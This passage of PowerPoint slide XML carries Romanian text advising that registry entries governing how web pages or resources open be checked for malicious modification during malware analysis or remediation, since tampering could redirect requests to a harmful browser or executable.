                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> cum </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>să</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> fie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>deschisă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>pagina</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>resursa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>solicitată</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Din </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>perspectiva</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>securității</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>este</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> important </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>să</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>verifice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>aceste</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>intrări</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>registru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>pentru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> a se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>asigura</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>că</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> nu au </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>fost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>modificate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>în</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> mod </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>malitios</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Modificările</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>neautorizate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>ar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>putea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>redirecționa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>solicitările</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>către</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> un browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>executabil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>dăunător</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>facilitând</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>atacuri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de tip phishing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> malware. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>În</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>contextul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>analizei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>remedierii</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> malware, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>verificarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>acestor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>intrări</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>poate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>ajuta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>identificarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>comportamentului</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>neașteptat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>modificărilor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sistemului</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>făcute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de software-ul </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
